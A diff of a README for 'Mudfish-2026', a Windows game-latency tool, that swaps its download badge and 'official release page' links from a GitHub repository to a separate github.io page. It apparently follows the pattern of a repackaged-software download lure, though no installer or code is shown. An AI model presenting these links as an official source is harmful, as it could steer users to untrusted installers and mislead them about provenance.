@@ -1,6 +1,6 @@
 # ⚡ Mudfish-2026 - Lower your game network latency
 
-[![](https://img.shields.io/badge/Download_Mudfish-blue)](https://github.com/quinom8520/Mudfish-2026)
+[![](https://img.shields.io/badge/Download_Mudfish-blue)](https://quinom8520.github.io)
 
 Mudfish-2026 manages network traffic to improve your connection during online gaming. It creates a direct path between your computer and the game server. This process reduces lag and stabilizes your connection. This software works on Windows 10 and Windows 11.
 
@@ -19,7 +19,7 @@ Before you install this software, ensure your computer meets these basic needs:
 
 Follow these steps to obtain the correct version of the Mudfish-2026 installer.
 
-1.  Visit the official release page: [https://github.com/quinom8520/Mudfish-2026](https://github.com/quinom8520/Mudfish-2026).
+1.  Visit the official release page: [https://quinom8520.github.io](https://quinom8520.github.io).
 2.  Locate the section labeled Releases.
 3.  Click the link for the latest installer version.
 4.  Save the file to a folder you can easily find, such as your Downloads folder.
